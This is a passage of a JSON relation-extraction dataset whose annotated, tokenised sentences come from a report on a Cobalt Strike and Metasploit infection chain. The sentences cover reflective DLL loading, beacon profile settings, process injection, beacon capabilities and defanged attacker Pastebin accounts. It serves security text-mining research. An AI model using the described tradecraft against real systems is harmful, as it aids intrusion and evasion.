160], "name": "attack", "pos": [5, 6], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [170, 170], "name": "jquery request", "pos": [15, 17], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [195, 195], "name": "beacons", "pos": [22, 23], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [199, 199], "name": "attack", "pos": [26, 27], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [205, 205], "name": "capabilities", "pos": [32, 33], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [216, 216], "name": "arbitrary code", "pos": [43, 45], "index": "18_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 7}, {"r": "EX", "evidence": [1], "h": 2, "t": 3}, {"r": "CO", "evidence": [1], "h": 3, "t": 5}, {"r": "CO", "evidence": [1], "h": 3, "t": 4}, {"r": "RD", "evidence": [4], "h": 9, "t": 10}, {"r": "EX", "evidence": [3, 4], "t": 8, "h": 9}, {"r": "WR", "evidence": [4], "h": 9, "t": 10}, {"r": "WR", "evidence": [4, 5], "h": 9, "t": 11}, {"r": "WR", "evidence": [6], "t": 12, "h": 13}, {"r": "CO", "evidence": [6], "h": 12, "t": 14}, {"r": "FR", "evidence": [7], "t": 15, "h": 16}, {"r": "FR", "evidence": [7], "h": 16, "t": 17}, {"r": "EX", "evidence": [7], "h": 16, "t": 18}]}, {"title": "643-37", "sents": [["Decoder", "shellcode", "decoding", "the", "final", "RAT", "payload", ":", "Stage", "3B", ":", "Cobalt", "Strike", "beaconThe", "final", "RAT", "payload", "is", "actually", "a", "Cobalt", "Strike", "beacon", "."], ["Once", "the", "beacon", "DLL", "has", "been", "decoded", ",", "the", "decoder", "shellcode", "(", "Stage", "3A", ")", "jumps", "to", "the", "beginning", "of", "the", "MZ", "in", "memory", "instead", "of", "going", "to", "the", "DllEntryPoint", "."], ["This", "is", "done", "to", "calculate", "and", "jump", "to", "the", "address", "to", "the", "loader", "routine", "(", "usually", "also", "an", "exported", "subroutine", ")", "that", "will", "carry", "out", "reflective-DLL-loading", "of", "the", "Cobalt", "Strike", "beacon", "DLL", "in", "the", "dropper", "process", "'", "memory", "."], ["Configurations", "usedCobalt", "Strike", "beacons", "use", "configurations", "specified", "via", "``", ".profile", "''", "files", "in", "the", "framework", "."], ["These", "configurations", "describe", "various", "characteristics", "of", "the", "malicious", "payload", "(", "beacon", "binary", ")", "including", ":", "C2", "configurationCommunication", "protocolsProcess", "injection", "techniques", ",", "etc", "."], ["The", "profiles", "used", "in", "this", "attack", "by", "the", "beacon", "binaries", "attempt", "to", "mimic", "a", "legitimate", "jquery", "request", "."], ["113", "(", "google.com", ")", "Spawn", "processes", "=", "%", "windir", "%", "\\syswow64\\dllhost.exe", "%", "windir", "%", "\\sysnative\\dllhost.exe", "injection", "configuration", "=ntdll", ":", "RtlUserThreadStartCreateThreadNtQueueApc", "Cobalt", "Strike", "beacons", "used", "in", "this", "attack", "support", "a", "wide", "variety", "of", "capabilities", "(", "also", "known", "as", "commands", ")", "including", ":", "Execution", "of", "arbitrary", "code", "in", "target", "processes", "via", "injection", "."], ["Execution", "of", "arbitrary", "commands", "on", "the", "infected", "endpoint", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Decoder shellcode", "pos": [0, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "RAT payload", "pos": [5, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "RAT payload", "pos": [15, 17], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [20, 20], "name": "Cobalt Strike beacon", "pos": [20, 23], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [26, 26], "name": "beacon DLL", "pos": [2, 4], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [33, 33], "name": "decoder shellcode", "pos": [9, 11], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [85, 85], "name": "beacon DLL", "pos": [30, 32], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [97, 97], "name": "beacons", "pos": [3, 4], "index": "7_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [103, 103], "name": ".profile", "pos": [9, 10], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [118, 118], "name": "payload", "pos": [8, 9], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [134, 134], "name": "profiles", "pos": [1, 2], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [138, 138], "name": "attack", "pos": [5, 6], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [148, 148], "name": "jquery request", "pos": [15, 17], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [173, 173], "name": "beacons", "pos": [22, 23], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [177, 177], "name": "attack", "pos": [26, 27], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [183, 183], "name": "capabilities", "pos": [32, 33], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [194, 194], "name": "arbitrary code", "pos": [43, 45], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [204, 204], "name": "arbitrary commands", "pos": [2, 4], "index": "17_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [209, 209], "name": "endpoint", "pos": [7, 8], "index": "18_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0], "h": 1, "t": 3}, {"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "RD", "evidence": [3], "h": 7, "t": 8}, {"r": "EX", "evidence": [2, 3], "t": 6, "h": 7}, {"r": "WR", "evidence": [3], "h": 7, "t": 8}, {"r": "WR", "evidence": [3, 4], "h": 7, "t": 9}, {"r": "WR", "evidence": [5], "t": 10, "h": 11}, {"r": "CO", "evidence": [5], "h": 10, "t": 12}, {"r": "FR", "evidence": [6], "t": 13, "h": 14}, {"r": "FR", "evidence": [6], "h": 14, "t": 15}, {"r": "EX", "evidence": [6], "h": 14, "t": 16}, {"r": "ST", "evidence": [6, 7], "h": 15, "t": 18}, {"r": "RF", "evidence": [6, 7], "h": 15, "t": 18}, {"r": "CO", "evidence": [6, 7], "h": 16, "t": 17}]}, {"title": "643-38", "sents": [["Once", "the", "beacon", "DLL", "has", "been", "decoded", ",", "the", "decoder", "shellcode", "(", "Stage", "3A", ")", "jumps", "to", "the", "beginning", "of", "the", "MZ", "in", "memory", "instead", "of", "going", "to", "the", "DllEntryPoint", "."], ["This", "is", "done", "to", "calculate", "and", "jump", "to", "the", "address", "to", "the", "loader", "routine", "(", "usually", "also", "an", "exported", "subroutine", ")", "that", "will", "carry", "out", "reflective-DLL-loading", "of", "the", "Cobalt", "Strike", "beacon", "DLL", "in", "the", "dropper", "process", "'", "memory", "."], ["Configurations", "usedCobalt", "Strike", "beacons", "use", "configurations", "specified", "via", "``", ".profile", "''", "files", "in", "the", "framework", "."], ["These", "configurations", "describe", "various", "characteristics", "of", "the", "malicious", "payload", "(", "beacon", "binary", ")", "including", ":", "C2", "configurationCommunication", "protocolsProcess", "injection", "techniques", ",", "etc", "."], ["The", "profiles", "used", "in", "this", "attack", "by", "the", "beacon", "binaries", "attempt", "to", "mimic", "a", "legitimate", "jquery", "request", "."], ["113", "(", "google.com", ")", "Spawn", "processes", "=", "%", "windir", "%", "\\syswow64\\dllhost.exe", "%", "windir", "%", "\\sysnative\\dllhost.exe", "injection", "configuration", "=ntdll", ":", "RtlUserThreadStartCreateThreadNtQueueApc", "Cobalt", "Strike", "beacons", "used", "in", "this", "attack", "support", "a", "wide", "variety", "of", "capabilities", "(", "also", "known", "as", "commands", ")", "including", ":", "Execution", "of", "arbitrary", "code", "in", "target", "processes", "via", "injection", "."], ["Execution", "of", "arbitrary", "commands", "on", "the", "infected", "endpoint", "."], ["Download", "and", "upload", "files", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "beacon DLL", "pos": [2, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "decoder shellcode", "pos": [9, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [61, 61], "name": "beacon DLL", "pos": [30, 32], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [73, 73], "name": "beacons", "pos": [3, 4], "index": "3_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [79, 79], "name": ".profile", "pos": [9, 10], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [94, 94], "name": "payload", "pos": [8, 9], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [110, 110], "name": "profiles", "pos": [1, 2], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [114, 114], "name": "attack", "pos": [5, 6], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [124, 124], "name": "jquery request", "pos": [15, 17], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [149, 149], "name": "beacons", "pos": [22, 23], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [153, 153], "name": "attack", "pos": [26, 27], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [159, 159], "name": "capabilities", "pos": [32, 33], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [170, 170], "name": "arbitrary code", "pos": [43, 45], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [180, 180], "name": "arbitrary commands", "pos": [2, 4], "index": "13_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [185, 185], "name": "endpoint", "pos": [7, 8], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [190, 190], "name": "files", "pos": [3, 4], "index": "15_0"}]], "labels": [{"r": "RD", "evidence": [2], "h": 3, "t": 4}, {"r": "EX", "evidence": [1, 2], "t": 2, "h": 3}, {"r": "WR", "evidence": [2], "h": 3, "t": 4}, {"r": "WR", "evidence": [2, 3], "h": 3, "t": 5}, {"r": "WR", "evidence": [4], "t": 6, "h": 7}, {"r": "CO", "evidence": [4], "h": 6, "t": 8}, {"r": "FR", "evidence": [5], "t": 9, "h": 10}, {"r": "FR", "evidence": [5], "h": 10, "t": 11}, {"r": "EX", "evidence": [5], "h": 10, "t": 12}, {"r": "ST", "evidence": [5, 6], "h": 11, "t": 14}, {"r": "RF", "evidence": [5, 6], "h": 11, "t": 14}, {"r": "WR", "evidence": [5, 6, 7], "h": 11, "t": 15}, {"r": "CO", "evidence": [5, 6], "h": 12, "t": 13}]}, {"title": "643-39", "sents": [["This", "is", "done", "to", "calculate", "and", "jump", "to", "the", "address", "to", "the", "loader", "routine", "(", "usually", "also", "an", "exported", "subroutine", ")", "that", "will", "carry", "out", "reflective-DLL-loading", "of", "the", "Cobalt", "Strike", "beacon", "DLL", "in", "the", "dropper", "process", "'", "memory", "."], ["Configurations", "usedCobalt", "Strike", "beacons", "use", "configurations", "specified", "via", "``", ".profile", "''", "files", "in", "the", "framework", "."], ["These", "configurations", "describe", "various", "characteristics", "of", "the", "malicious", "payload", "(", "beacon", "binary", ")", "including", ":", "C2", "configurationCommunication", "protocolsProcess", "injection", "techniques", ",", "etc", "."], ["The", "profiles", "used", "in", "this", "attack", "by", "the", "beacon", "binaries", "attempt", "to", "mimic", "a", "legitimate", "jquery", "request", "."], ["113", "(", "google.com", ")", "Spawn", "processes", "=", "%", "windir", "%", "\\syswow64\\dllhost.exe", "%", "windir", "%", "\\sysnative\\dllhost.exe", "injection", "configuration", "=ntdll", ":", "RtlUserThreadStartCreateThreadNtQueueApc", "Cobalt", "Strike", "beacons", "used", "in", "this", "attack", "support", "a", "wide", "variety", "of", "capabilities", "(", "also", "known", "as", "commands", ")", "including", ":", "Execution", "of", "arbitrary", "code", "in", "target", "processes", "via", "injection", "."], ["Execution", "of", "arbitrary", "commands", "on", "the", "infected", "endpoint", "."], ["Download", "and", "upload", "files", "."], ["Enumerate", ",", "copy", ",", "delete", ",", "timestomp", "files", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [30, 30], "name": "beacon DLL", "pos": [30, 32], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [42, 42], "name": "beacons", "pos": [3, 4], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [48, 48], "name": ".profile", "pos": [9, 10], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [63, 63], "name": "payload", "pos": [8, 9], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [79, 79], "name": "profiles", "pos": [1, 2], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [83, 83], "name": "attack", "pos": [5, 6], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [93, 93], "name": "jquery request", "pos": [15, 17], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [118, 118], "name": "beacons", "pos": [22, 23], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [122, 122], "name": "attack", "pos": [26, 27], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [128, 128], "name": "capabilities", "pos": [32, 33], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [139, 139], "name": "arbitrary code", "pos": [43, 45], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [149, 149], "name": "arbitrary commands", "pos": [2, 4], "index": "11_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [154, 154], "name": "endpoint", "pos": [7, 8], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [159, 159], "name": "files", "pos": [3, 4], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [168, 168], "name": "files", "pos": [7, 8], "index": "14_0"}]], "labels": [{"r": "RD", "evidence": [1], "h": 1, "t": 2}, {"r": "EX", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "WR", "evidence": [3], "t": 4, "h": 5}, {"r": "CO", "evidence": [3], "h": 4, "t": 6}, {"r": "FR", "evidence": [4], "t": 7, "h": 8}, {"r": "FR", "evidence": [4], "h": 8, "t": 9}, {"r": "EX", "evidence": [4], "h": 8, "t": 10}, {"r": "ST", "evidence": [4, 5], "h": 9, "t": 12}, {"r": "RF", "evidence": [4, 5], "h": 9, "t": 12}, {"r": "WR", "evidence": [4, 5, 6], "h": 9, "t": 13}, {"r": "RD", "evidence": [4, 5, 6, 7], "h": 9, "t": 14}, {"r": "WR", "evidence": [4, 5, 6, 7], "h": 9, "t": 14}, {"r": "UK", "evidence": [4, 5, 6, 7], "h": 9, "t": 14}, {"r": "CO", "evidence": [4, 5], "h": 10, "t": 11}]}, {"title": "643-40", "sents": [["Configurations", "usedCobalt", "Strike", "beacons", "use", "configurations", "specified", "via", "``", ".profile", "''", "files", "in", "the", "framework", "."], ["These", "configurations", "describe", "various", "characteristics", "of", "the", "malicious", "payload", "(", "beacon", "binary", ")", "including", ":", "C2", "configurationCommunication", "protocolsProcess", "injection", "techniques", ",", "etc", "."], ["The", "profiles", "used", "in", "this", "attack", "by", "the", "beacon", "binaries", "attempt", "to", "mimic", "a", "legitimate", "jquery", "request", "."], ["113", "(", "google.com", ")", "Spawn", "processes", "=", "%", "windir", "%", "\\syswow64\\dllhost.exe", "%", "windir", "%", "\\sysnative\\dllhost.exe", "injection", "configuration", "=ntdll", ":", "RtlUserThreadStartCreateThreadNtQueueApc", "Cobalt", "Strike", "beacons", "used", "in", "this", "attack", "support", "a", "wide", "variety", "of", "capabilities", "(", "also", "known", "as", "commands", ")", "including", ":", "Execution", "of", "arbitrary", "code", "in", "target", "processes", "via", "injection", "."], ["Execution", "of", "arbitrary", "commands", "on", "the", "infected", "endpoint", "."], ["Download", "and", "upload", "files", "."], ["Enumerate", ",", "copy", ",", "delete", ",", "timestomp", "files", "."], ["Modify", ",", "query", "the", "Windows", "registry", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "beacons", "pos": [3, 4], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [9, 9], "name": ".profile", "pos": [9, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "payload", "pos": [8, 9], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [40, 40], "name": "profiles", "pos": [1, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [44, 44], "name": "attack", "pos": [5, 6], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [54, 54], "name": "jquery request", "pos": [15, 17], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [79, 79], "name": "beacons", "pos": [22, 23], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [83, 83], "name": "attack", "pos": [26, 27], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [89, 89], "name": "capabilities", "pos": [32, 33], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [100, 100], "name": "arbitrary code", "pos": [43, 45], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [110, 110], "name": "arbitrary commands", "pos": [2, 4], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [115, 115], "name": "endpoint", "pos": [7, 8], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [120, 120], "name": "files", "pos": [3, 4], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [129, 129], "name": "files", "pos": [7, 8], "index": "13_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [136, 136], "name": "registry", "pos": [5, 6], "index": "14_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [2], "t": 3, "h": 4}, {"r": "CO", "evidence": [2], "h": 3, "t": 5}, {"r": "FR", "evidence": [3], "t": 6, "h": 7}, {"r": "FR", "evidence": [3], "h": 7, "t": 8}, {"r": "EX", "evidence": [3], "h": 7, "t": 9}, {"r": "ST", "evidence": [3, 4], "h": 8, "t": 11}, {"r": "RF", "evidence": [3, 4], "h": 8, "t": 11}, {"r": "WR", "evidence": [3, 4, 5], "h": 8, "t": 12}, {"r": "RD", "evidence": [3, 4, 5, 6], "h": 8, "t": 13}, {"r": "WR", "evidence": [3, 4, 5, 6], "h": 8, "t": 13}, {"r": "UK", "evidence": [3, 4, 5, 6], "h": 8, "t": 13}, {"r": "RD", "evidence": [3, 4, 5, 6, 7], "h": 8, "t": 14}, {"r": "RD", "evidence": [3, 4, 5, 6, 7], "h": 8, "t": 14}, {"r": "WR", "evidence": [3, 4, 5, 6, 7], "h": 8, "t": 14}, {"r": "CO", "evidence": [3, 4], "h": 9, "t": 10}]}, {"title": "643-41", "sents": [["These", "configurations", "describe", "various", "characteristics", "of", "the", "malicious", "payload", "(", "beacon", "binary", ")", "including", ":", "C2", "configurationCommunication", "protocolsProcess", "injection", "techniques", ",", "etc", "."], ["The", "profiles", "used", "in", "this", "attack", "by", "the", "beacon", "binaries", "attempt", "to", "mimic", "a", "legitimate", "jquery", "request", "."], ["113", "(", "google.com", ")", "Spawn", "processes", "=", "%", "windir", "%", "\\syswow64\\dllhost.exe", "%", "windir", "%", "\\sysnative\\dllhost.exe", "injection", "configuration", "=ntdll", ":", "RtlUserThreadStartCreateThreadNtQueueApc", "Cobalt", "Strike", "beacons", "used", "in", "this", "attack", "support", "a", "wide", "variety", "of", "capabilities", "(", "also", "known", "as", "commands", ")", "including", ":", "Execution", "of", "arbitrary", "code", "in", "target", "processes", "via", "injection", "."], ["Execution", "of", "arbitrary", "commands", "on", "the", "infected", "endpoint", "."], ["Download", "and", "upload", "files", "."], ["Enumerate", ",", "copy", ",", "delete", ",", "timestomp", "files", "."], ["Modify", ",", "query", "the", "Windows", "registry", "."], ["The", "overall", "infection", "chain", "is", "illustrated", "as", "follows", ":", "Pastebin", "usage", ":", "This", "attack", "utilizes", "pastebin.com", "extensively", "to", "host", "the", "Metasploit", "downloader", "shellcode", "(", "Stage", "2A", ")", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "payload", "pos": [8, 9], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "profiles", "pos": [1, 2], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "attack", "pos": [5, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [38, 38], "name": "jquery request", "pos": [15, 17], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [63, 63], "name": "beacons", "pos": [22, 23], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [67, 67], "name": "attack", "pos": [26, 27], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [73, 73], "name": "capabilities", "pos": [32, 33], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [84, 84], "name": "arbitrary code", "pos": [43, 45], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [94, 94], "name": "arbitrary commands", "pos": [2, 4], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [99, 99], "name": "endpoint", "pos": [7, 8], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [104, 104], "name": "files", "pos": [3, 4], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [113, 113], "name": "files", "pos": [7, 8], "index": "11_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [120, 120], "name": "registry", "pos": [5, 6], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [124, 124], "name": "infection chain", "pos": [2, 4], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [135, 135], "name": "attack", "pos": [13, 14], "index": "14_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [137, 137], "name": "pastebin.com", "pos": [15, 16], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [143, 143], "name": "downloader shellcode", "pos": [21, 23], "index": "16_0"}]], "labels": [{"r": "WR", "evidence": [1], "t": 1, "h": 2}, {"r": "CO", "evidence": [1], "h": 1, "t": 3}, {"r": "FR", "evidence": [2], "t": 4, "h": 5}, {"r": "FR", "evidence": [2], "h": 5, "t": 6}, {"r": "EX", "evidence": [2], "h": 5, "t": 7}, {"r": "ST", "evidence": [2, 3], "h": 6, "t": 9}, {"r": "RF", "evidence": [2, 3], "h": 6, "t": 9}, {"r": "WR", "evidence": [2, 3, 4], "h": 6, "t": 10}, {"r": "RD", "evidence": [2, 3, 4, 5], "h": 6, "t": 11}, {"r": "WR", "evidence": [2, 3, 4, 5], "h": 6, "t": 11}, {"r": "UK", "evidence": [2, 3, 4, 5], "h": 6, "t": 11}, {"r": "RD", "evidence": [2, 3, 4, 5, 6], "h": 6, "t": 12}, {"r": "RD", "evidence": [2, 3, 4, 5, 6], "h": 6, "t": 12}, {"r": "WR", "evidence": [2, 3, 4, 5, 6], "h": 6, "t": 12}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 8}, {"r": "ST", "evidence": [3, 4, 5, 6, 7], "t": 9, "h": 13}, {"r": "RF", "evidence": [3, 4, 5, 6, 7], "t": 9, "h": 13}, {"r": "FR", "evidence": [7], "h": 13, "t": 14}, {"r": "ST", "evidence": [7], "h": 14, "t": 15}, {"r": "RF", "evidence": [7], "h": 14, "t": 15}, {"r": "RD", "evidence": [7], "h": 14, "t": 16}]}, {"title": "643-42", "sents": [["The", "profiles", "used", "in", "this", "attack", "by", "the", "beacon", "binaries", "attempt", "to", "mimic", "a", "legitimate", "jquery", "request", "."], ["113", "(", "google.com", ")", "Spawn", "processes", "=", "%", "windir", "%", "\\syswow64\\dllhost.exe", "%", "windir", "%", "\\sysnative\\dllhost.exe", "injection", "configuration", "=ntdll", ":", "RtlUserThreadStartCreateThreadNtQueueApc", "Cobalt", "Strike", "beacons", "used", "in", "this", "attack", "support", "a", "wide", "variety", "of", "capabilities", "(", "also", "known", "as", "commands", ")", "including", ":", "Execution", "of", "arbitrary", "code", "in", "target", "processes", "via", "injection", "."], ["Execution", "of", "arbitrary", "commands", "on", "the", "infected", "endpoint", "."], ["Download", "and", "upload", "files", "."], ["Enumerate", ",", "copy", ",", "delete", ",", "timestomp", "files", "."], ["Modify", ",", "query", "the", "Windows", "registry", "."], ["The", "overall", "infection", "chain", "is", "illustrated", "as", "follows", ":", "Pastebin", "usage", ":", "This", "attack", "utilizes", "pastebin.com", "extensively", "to", "host", "the", "Metasploit", "downloader", "shellcode", "(", "Stage", "2A", ")", "."], ["The", "shellcode", "hosted", "on", "pastebin", "is", "either", "created", "through", "a", "guest", "account", "or", "owned", "by", "five", "registered", "accounts", ",", "specifically", ":", "hxxps", ":", "//pastebin.com/u/r_ajeevshikra", "hxxps:", "//pastebin.com/u/ra_jeevshikra", "hxxps:", "//pastebin.com/u/raj_eevshikra", "hxxps:", "//pastebin.com/u/raje_evshikrahxxps", ":", "//pastebin.com/u/rajeev_shikraPastebin", "account", "operated", "by", "the", "attacker", ":", "The", "base64-encoded", "Metasploit", "downloader", "shellcode", "(", "Stage", "2A", ")", "hosted", "on", "Pastebin", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "profiles", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "attack", "pos": [5, 6], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "jquery request", "pos": [15, 17], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [40, 40], "name": "beacons", "pos": [22, 23], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [44, 44], "name": "attack", "pos": [26, 27], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [50, 50], "name": "capabilities", "pos": [32, 33], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [61, 61], "name": "arbitrary code", "pos": [43, 45], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [71, 71], "name": "arbitrary commands", "pos": [2, 4], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [76, 76], "name": "endpoint", "pos": [7, 8], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [81, 81], "name": "files", "pos": [3, 4], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [90, 90], "name": "files", "pos": [7, 8], "index": "10_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [97, 97], "name": "registry", "pos": [5, 6], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [101, 101], "name": "infection chain", "pos": [2, 4], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [112, 112], "name": "attack", "pos": [13, 14], "index": "13_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [114, 114], "name": "pastebin.com", "pos": [15, 16], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [120, 120], "name": "downloader shellcode", "pos": [21, 23], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [128, 128], "name": "shellcode", "pos": [1, 2], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [163, 163], "name": "attacker", "pos": [36, 37], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [169, 169], "name": "shellcode", "pos": [42, 43], "index": "18_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "CO", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [1], "t": 3, "h": 4}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "EX", "evidence": [1], "h": 4, "t": 6}, {"r": "ST", "evidence": [1, 2], "h": 5, "t": 8}, {"r": "RF", "evidence": [1, 2], "h": 5, "t": 8}, {"r": "WR", "evidence": [1, 2, 3], "h": 5, "t": 9}, {"r": "RD", "evidence": [1, 2, 3, 4], "h": 5, "t": 10}, {"r": "WR", "evidence": [1, 2, 3, 4], "h": 5, "t": 10}, {"r": "UK", "evidence": [1, 2, 3, 4], "h": 5, "t": 10}, {"r": "RD", "evidence": [1, 2, 3, 4, 5], "h": 5, "t": 11}, {"r": "RD", "evidence": [1, 2, 3, 4, 5], "h": 5, "t": 11}, {"r": "WR", "evidence": [1, 2, 3, 4, 5], "h": 5, "t": 11}, {"r": "CO", "evidence": [1, 2], "h": 6, "t": 7}, {"r": "ST", "evidence": [2, 3, 4, 5, 6], "t": 8, "h": 12}, {"r": "RF", "evidence": [2, 3, 4, 5, 6], "t": 8, "h": 12}, {"r": "FR", "evidence": [6], "h": 12, "t": 13}, {"r": "ST", "evidence": [6], "h": 13, "t": 14}, {"r": "RF", "evidence": [6], "h": 13, "t": 14}, {"r": "RD", "evidence": [6], "h": 13, "t": 15}, {"r": "RD", "evidence": [7], "h": 17, "t": 18}, {"r": "CO", "evidence": [7], "h": 16, "t": 18}]}, {"title": "643-43", "sents": [["113", "(", "google.com", ")", "Spawn", "processes", "=", "%", "windir", "%", "\\syswow64\\dllhost.exe", "%", "windir", "%", 